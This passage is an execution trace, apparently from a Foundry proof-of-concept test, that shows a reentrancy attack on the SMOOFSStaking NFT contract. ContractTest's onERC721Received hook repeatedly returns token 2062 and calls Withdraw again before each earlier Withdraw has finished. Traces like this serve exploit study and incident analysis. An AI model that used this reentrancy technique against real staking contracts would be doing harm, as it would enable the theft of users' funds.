    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [11734448] 0x9D6cb01fB91F8c6616e822Cf90A4b3D8Eb0569c6::Withdraw(2062, true) [delegatecall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [9874354] Smoofs::safeTransferFrom(SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2062)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Transfer(_from: SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], _to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], _tokenId: 2062)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [9826624] ContractTest::onERC721Received(SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], 2062, 0x)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [52814] Smoofs::safeTransferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], 2062)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Transfer(_from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], _to: SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], _tokenId: 2062)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [2284] SMOOFSStaking::onERC721Received(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2062, 0x)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [1870] 0x9D6cb01fB91F8c6616e822Cf90A4b3D8Eb0569c6::onERC721Received(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2062, 0x) [delegatecall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x150b7a02
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x150b7a02
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [9771768] SMOOFSStaking::Withdraw(2062, true)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [9771375] 0x9D6cb01fB91F8c6616e822Cf90A4b3D8Eb0569c6::Withdraw(2062, true) [delegatecall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [7911281] Smoofs::safeTransferFrom(SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2062)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Transfer(_from: SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], _to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], _tokenId: 2062)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [7863551] ContractTest::onERC721Received(SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], 2062, 0x)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [52814] Smoofs::safeTransferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], 2062)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Transfer(_from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], _to: SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], _tokenId: 2062)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [2284] SMOOFSStaking::onERC721Received(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2062, 0x)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [1870] 0x9D6cb01fB91F8c6616e822Cf90A4b3D8Eb0569c6::onERC721Received(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2062, 0x) [delegatecall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x150b7a02
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x150b7a02
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [7808695] SMOOFSStaking::Withdraw(2062, true)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [7808302] 0x9D6cb01fB91F8c6616e822Cf90A4b3D8Eb0569c6::Withdraw(2062, true) [delegatecall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [5948208] Smoofs::safeTransferFrom(SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2062)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Transfer(_from: SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], _to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], _tokenId: 2062)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [5900478] ContractTest::onERC721Received(SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], 2062, 0x)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [52814] Smoofs::safeTransferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], 2062)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Transfer(_from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], _to: SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], _tokenId: 2062)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [2284] SMOOFSStaking::onERC721Received(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2062, 0x)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [1870] 0x9D6cb01fB91F8c6616e822Cf90A4b3D8Eb0569c6::onERC721Received(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2062, 0x) [delegatecall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x150b7a02
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x150b7a02
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [5845622] SMOOFSStaking::Withdraw(2062, true)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [5845229] 0x9D6cb01fB91F8c6616e822Cf90A4b3D8Eb0569c6::Withdraw(2062, true) [delegatecall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [3985135] Smoofs::safeTransferFrom(SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2062)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Transfer(_from: SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], _to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], _tokenId: 2062)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [3937405] ContractTest::onERC721Received(SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], 2062, 0x)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [52814] Smoofs::safeTransferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], 2062)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Transfer(_from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], _to: SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], _tokenId: 2062)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [2284] SMOOFSStaking::onERC721Received(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2062, 0x)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [1870] 0x9D6cb01fB91F8c6616e822Cf90A4b3D8Eb0569c6::onERC721Received(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2062, 0x) [delegatecall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x150b7a02
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x150b7a02
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [3882549] SMOOFSStaking::Withdraw(2062, true)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [3882156] 0x9D6cb01fB91F8c6616e822Cf90A4b3D8Eb0569c6::Withdraw(2062, true) [delegatecall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [2017262] Smoofs::safeTransferFrom(SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2062)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Transfer(_from: SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], _to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], _tokenId: 2062)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [1969532] ContractTest::onERC721Received(SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], 2062, 0x)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [52814] Smoofs::safeTransferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], 2062)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Transfer(_from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], _to: SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], _tokenId: 2062)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [2284] SMOOFSStaking::onERC721Received(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2062, 0x)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [1870] 0x9D6cb01fB91F8c6616e822Cf90A4b3D8Eb0569c6::onERC721Received(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2062, 0x) [delegatecall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x150b7a02
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x150b7a02
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [1914676] SMOOFSStaking::Withdraw(2062, true)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [1914283] 0x9D6cb01fB91F8c6616e822Cf90A4b3D8Eb0569c6::Withdraw(2062, true) [delegatecall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [48617] Smoofs::safeTransferFrom(SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2062)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Transfer(_from: SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], _to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], _tokenId: 2062)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [887] ContractTest::onERC721Received(SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], 2062, 0x)
